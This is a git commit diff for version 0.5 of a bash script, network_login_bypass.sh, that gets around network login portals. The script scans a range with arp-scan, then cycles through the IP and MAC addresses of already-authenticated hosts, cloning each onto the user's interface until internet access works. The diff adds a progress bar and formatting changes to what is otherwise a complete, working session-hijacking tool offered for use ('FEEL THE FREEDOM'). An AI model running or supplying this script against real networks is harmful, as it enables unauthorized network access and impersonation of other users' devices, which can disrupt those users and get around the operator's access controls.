87d133d795b5778f215af581f4631b63798ba949
MasterOfD3c0d3 <masterofdecode@gmail.com>
2016-05-12 15:19:03 -0300

    v0.5
    Fixed a typo in range examples;
    Bug fixed (Always showing the not connected interface error);
    Added a progress bar (It needs just a few improvement)

--- network_login_bypass.sh
+++ network_login_bypass.sh
@@ -19,15 +19,14 @@
 #
 # network_login_bypass.sh - Search for an authenticated machine in a
 # network with login request, so its IP and MAC address are cloned.
-# 
-# ------------------------------------------------------------------
+#
 # This script receives the user connected interface and an IP range
 # from the network as parameters, so it clones each IP address from
 # range and checks the connectivity, if an IP responds to ping, it
 # stops and your new status on the network are shown.
 #
 # Examples:
-#	$ ./network_login_bypass.sh -i wlan0 -r 10.15.16.0/30
+#	$ ./network_login_bypass.sh -i wlan0 -r 10.15.16.0/24
 #	BYPASS LOGIN REQUEST FROM NETWORK
 #	---------------------------------
 #
@@ -37,8 +36,7 @@
 #
 # The order of the IP connectivity checks are sequential
 # ------------------------------------------------------
-# 
-# 
+#
 # Changelog:
 #
 #	v0.1 Apr/2016
@@ -50,10 +48,14 @@
 #	v0.4 May/2016
 #		- Added the options (-i, -r)
 #		- Added a validation for interface and range
-#
+#	v0.5 May/2016
+#		- Fixed a typo in range examples
+#		- Bug fixed (Always showing the not connected interface error)
+#		- Added a progress bar (It needs just a few improvement)
 #
 # License: GNU General Public License v3.0
-# -----------------------------------------------------------------
+# Download: http://github.com/MasterOfD3c0d3/Network-Login-Bypass
+# ---------------------------------------------------------------
 #
 #SCRIPT OPTIONS
 USAGE_MSG="
@@ -100,25 +102,25 @@ do
 			#CHECKING IF INTERFACE EXISTS ON THE COMPUTER
 			found=`grep "$interface" /proc/net/dev`
 			if [ ! -n "$found" ]; then
-			   clear
-			   echo -e $title
-			   echo -e $div
-			   echo
-			   echo -e "\033[31;1mThe chosen interface ($interface) does not exist on your computer!\033[m"
-			   read
-			   exit 1
+				clear
+				echo -e $title
+				echo -e $div
+				echo
+				echo -e "\033[31;1mThe chosen interface ($interface) does not exist on your computer!\033[m"
+				read
+				exit 1
 			fi
 
 			#CHECKING IF INTERFACE IS CONNECTED
-			inet=`ifconfig "$interface" | grep "inet addr"`
+			inet=`ifconfig "$interface" | grep "inet "`
 			if [ -z "$inet" ]; then
-			   clear
-			   echo -e $title
-			   echo -e $div
-			   echo
-			   echo -e "\033[31;1mThe chosen interface ($interface) is not connected to any network!\033[m"
-			   read
-			   exit 1
+				clear
+				echo -e $title
+				echo -e $div
+				echo
+				echo -e "\033[31;1mThe chosen interface ($interface) is not connected to any network!\033[m"
+				read
+				exit 1
 			fi
 		;;
 		
@@ -148,20 +150,20 @@ do
 done
 #CHECKING ROOT ACCESS
 if [[ $EUID -ne 0 ]]; then
-   echo -n $(basename "$0")
-   echo -e ": This script $(basename "$0") needs root access!"
-   exit 1
+	echo -n $(basename "$0")
+	echo -e ": This script needs root access!"
+	exit 1
 fi
 #CHECKING IF IT'S ALREADY CONNECTED TO THE INTERNET
 result=`nice -n -20 ping 8.8.8.8 -c 1 | grep "ttl" | cut -d " " -f 6 | cut -d "=" -f 1`
 if [ -n "$result" ]; then
-   clear
-   echo -e $title
-   echo -e $div
-   echo
-   echo -e "\033[31;1mScript was not run. \033[32;1mYou're already connected to the internet!\033[m"
-   read
-   exit 0
+	clear
+	echo -e $title
+	echo -e $div
+	echo
+	echo -e "\033[31;1mScript was not run. \033[32;1mYou're already connected to the internet!\033[m"
+	read
+	exit 0
 fi
 #CHECKING IF INTERFACE VALUE WAS SET IN OPTIONS
 if [ -z "$interface" ]; then
@@ -175,35 +177,35 @@ if [ -z "$interface" ]; then
 	read interface
 	#CHECKING EMPTY INTERFACE VALUE
 	if [ "$interface" = "" ]; then
-	   clear
-	   echo -e $title
-	   echo -e $div
-	   echo
-	   echo -e "\033[31;1mNo interface was informed, insert an interface correctly!\033[m"
-	   read
-	   exit 1
+		clear
+		echo -e $title
+		echo -e $div
+		echo
+		echo -e "\033[31;1mNo interface was informed, insert an interface correctly!\033[m"
+		read
+		exit 1
 	fi
 	#CHECKING IF INTERFACE EXISTS ON THE COMPUTER
 	found=`grep "$interface" /proc/net/dev`
 	if [ ! -n "$found" ]; then
-	   clear
-	   echo -e $title
-	   echo -e $div
-	   echo
-	   echo -e "\033[31;1mThe chosen interface ($interface) does not exist on your computer!\033[m"
-	   read
-	   exit 1
+		clear
+		echo -e $title
+		echo -e $div
+		echo
+		echo -e "\033[31;1mThe chosen interface ($interface) does not exist on your computer!\033[m"
+		read
+		exit 1
 	fi
 	#CHECKING IF INTERFACE IS CONNECTED
-	inet=`ifconfig "$interface" | grep "inet addr"`
+	inet=`ifconfig "$interface" | grep "inet "`
 	if [ -z "$inet" ]; then
-	   clear
-	   echo -e $title
-	   echo -e $div
-	   echo
-	   echo -e "\033[31;1mThe chosen interface ($interface) is not connected to any network!\033[m"
-	   read
-	   exit 1
+		clear
+		echo -e $title
+		echo -e $div
+		echo
+		echo -e "\033[31;1mThe chosen interface ($interface) is not connected to any network!\033[m"
+		read
+		exit 1
 	fi
 fi
 #CHECKING IF RANGE VALUE WAS SET IN OPTIONS
@@ -213,85 +215,107 @@ if [ -z "$range" ]; then
 	echo -e $div
 	echo
 	echo "Type an IP range from network:"
-	echo "Example: 10.15.16.0/30"
+	echo -e "Example: 10.15.16.0/24"
 	echo
 	read range
 	#CHECKING EMPTY RANGE VALUE
 	if [ "$range" = "" ]; then
-	   clear
-	   echo -e $title
-	   echo -e $div
-	   echo
-	   echo -e "\033[31;1mNo range was informed, insert a range correctly!\033[m"
-	   read
-	   exit 1
+		clear
+		echo -e $title
+		echo -e $div
+		echo
+		echo -e "\033[31;1mNo range was informed, insert a range correctly!\033[m"
+		read
+		exit 1
 	fi
 fi
 #GETTING NETWORK GATEWAY
-gateway=`route -n | grep --color UG | cut -d " " -f 10`
+gateway=`route -n | grep UG | cut -d " " -f 10`
 #GENERATING A CONNECTED IP AND MAC ADDRESS LIST
 arp-scan -I $interface $range | grep -v Interface | grep -v Starting | grep -v received | grep -v Ending | cut -f 1,2 > tempList_network_login_bypass.txt
-clear
-echo -e $title
-echo -e $div
-echo
-echo "Running!"
-echo
-echo "Please, wait..."
-echo
+#PROGRESS BAR CODE
+num=`wc -l < tempList_network_login_bypass.txt`
+porc=$(awk "BEGIN {printf \"%.4f\",50/${num}}")
+load=0
 #CHECKING EACH IP AND MAC FROM THE LIST
 while read line; do
-   ip=$( echo "$line" | cut -f 1 )
-   mac=$( echo "$line" | cut -f 2 )
-   ifconfig $interface down
-   ifconfig $interface hw ether $mac
-   ifconfig $interface $ip
-   ifconfig $interface up
-   route add default gw $gateway
-   #CHECKING CONNECTIVITY
-   sleep 5
-   result=`nice -n -20 ping 8.8.8.8 -c 1 | grep "ttl" | cut -d " " -f 6 | cut -d "=" -f 1`
-   if [ -n "$result" ]; then
-	  #REMOVING THE CONNECTED IP AND MAC ADDRESS LIST
-      file="tempList_network_login_bypass.txt"
-      if [ -f $file ]; then
-         rm $file
-      fi
-      clear
-      echo -e $title
-      echo -e $div
-      echo
-      echo -e "\033[32;1mLogin Request Bypassed. You are now connected to the internet!\033[m"
-	  echo
-	  echo -e "\033[32;1mFEEL THE FREEDOM! \033[33;1m:)\033[m"
-      read
-      exit 0
-   fi
+	ip=$( echo "$line" | cut -f 1 )
+	mac=$( echo "$line" | cut -f 2 )
+	ifconfig $interface down
+	ifconfig $interface hw ether $mac
+	ifconfig $interface $ip
+	ifconfig $interface up
+	route add default gw $gateway
+	#CHECKING CONNECTIVITY
+	sleep 5
+	result=`nice -n -20 ping 8.8.8.8 -c 1 | grep "ttl" | cut -d " " -f 6 | cut -d "=" -f 1`
+	if [ -n "$result" ]; then
+		#REMOVING THE CONNECTED IP AND MAC ADDRESS LIST
+		file="tempList_network_login_bypass.txt"
+		if [ -f $file ]; then
+			rm $file
+		fi
+		clear
+		echo -e $title
+		echo -e $div
+		echo
+		echo -e "\033[32;1mLogin Request Bypassed. You are now connected to the internet!\033[m"
+		echo
+		echo -e "\033[32;1mFEEL THE FREEDOM! \033[33;1m:)\033[m"
+		read
+		exit 0
+	fi
+	
+	#PROGRESS BAR CODE
+	load=$(awk "BEGIN {printf \"%.4f\",${load}+(${porc}*2)}")
+	intLoad=${load%.*}
+	position=$(($intLoad/2))
+	
+	clear
+	echo -e $title
+	echo -e $div
+	echo
+	echo "Running!"
+	echo
+	echo "Please, wait..."
+	echo
+	echo "Checked IPs from range:"
+	
+	hash=$(printf '#%.0s' $(seq 1 $position))
+	rest=$((50-$position))
+	if [ ! $rest = 0  ]; then
+		point=$(printf '.%.0s' $(seq 1 $rest))
+	else
+		point=''
+	fi
+	
+	echo -e "\033[5D[$hash$point] $intLoad%"
+
 done <tempList_network_login_bypass.txt
 #REMOVING THE CONNECTED IP AND MAC ADDRESS LIST
 file="tempList_network_login_bypass.txt"
 if [ -f $file ]; then
-   rm $file
+	rm $file
 fi
 #MAKING A LAST CONNECTIVITY CHECK
 sleep 5
 result=`nice -n -20 ping 8.8.8.8 -c 1 | grep "ttl" | cut -d " " -f 6 | cut -d "=" -f 1`
 if [ -n "$result" ]; then
-   clear
-   echo -e $title
-   echo -e $div
-   echo
-   echo -e "\033[32;1mLogin Request Bypassed. You are now connected to the internet!\033[m"
-   echo
-   echo -e "\033[32;1mFEEL THE FREEDOM! \033[33;1m:)\033[m"
-   read
-   exit 0
+	clear
+	echo -e $title
+	echo -e $div
+	echo
+	echo -e "\033[32;1mLogin Request Bypassed. You are now connected to the internet!\033[m"
+	echo
+	echo -e "\033[32;1mFEEL THE FREEDOM! \033[33;1m:)\033[m"
+	read
+	exit 0
 else
-   clear
-   echo -e $title
-   echo -e $div
-   echo
-   echo -e "\033[31;1mSorry, but it was not possible to bypass login request.\033[m"
-   echo
-   exit 1
+	clear
+	echo -e $title
+	echo -e $div
+	echo
+	echo -e "\033[31;1mSorry, but it was not possible to bypass login request.\033[m"
+	echo
+	exit 1
 fi
